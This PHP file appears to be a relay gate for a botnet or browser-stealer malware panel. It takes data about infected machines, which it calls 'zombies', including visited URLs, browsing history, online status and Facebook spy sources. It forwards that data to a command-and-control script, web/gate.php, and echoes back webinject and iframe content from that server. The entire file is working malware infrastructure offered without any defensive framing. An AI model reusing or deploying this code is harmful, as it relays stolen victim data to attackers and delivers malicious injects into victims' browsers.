<?php
$z_name = $_SERVER['REMOTE_ADDR'];

//domain

if(isset($_GET['info']) && isset($_GET['url']) && $_GET['info'] != '' && $_GET['url'] != '')
{
    $info = $_GET['info'];
    $url_check = $_GET['url'];
    $url = $domain."web/gate.php?info=".$info."&url=".$url_check."&zname=".$z_name;
    file_get_contents($url);
}
if(isset($_GET['n']) && $_GET['n'] != '' && isset($_GET['version']) && $_GET['version'] != '')
{
    $url = $domain."web/gate.php?add=".$z_name."&version=".$_GET['version'];
    file_get_contents($url);
}
if(isset($_GET['history']) && $_GET['history'] != ''){
    $url = $domain."web/gate.php?history=".$_GET['history']."&zombie=".$z_name;  file_get_contents($url); 
}
if(isset($_GET['online']) && $_GET['online'] != ''){
    $url = $domain."web/gate.php?online=".$z_name;
    file_get_contents($url);
}
if(isset($_GET['iframe']) && $_GET['iframe'] != ''){
    $url = $domain."web/gate.php?iframe=1ee&zombie=".$z_name;
    echo file_get_contents($url);
}
if(isset($_GET['webinject']) && $_GET['webinject'] != ''){
    $url = $domain."web/gate.php?webinject=".$_GET['webinject']."&zombie=".$z_name;
    echo file_get_contents($url);
}
if(isset($_POST['facebookspy_add']) && $_POST['facebookspy_add'] != ''){
    $fields = array('add_source_spy' => urlencode($_POST['facebookspy_add']),
                    'z_name' => urlencode($z_name)
                   );
    $fields_string = "";
    foreach($fields as $key => $value)
    {
        $fields_string .= $key.'='.$value.'&';
    }
    rtrim($fields_string, '&');
    $ch = curl_init();
    $url = $domain."web/gate.php";
    curl_setopt($ch,CURLOPT_URL, $url);
    curl_setopt($ch,CURLOPT_POST, count($fields));
    curl_setopt($ch,CURLOPT_POSTFIELDS, $fields_string);
    $result = curl_exec($ch);
    curl_close($ch);
    echo "ok";
}
?>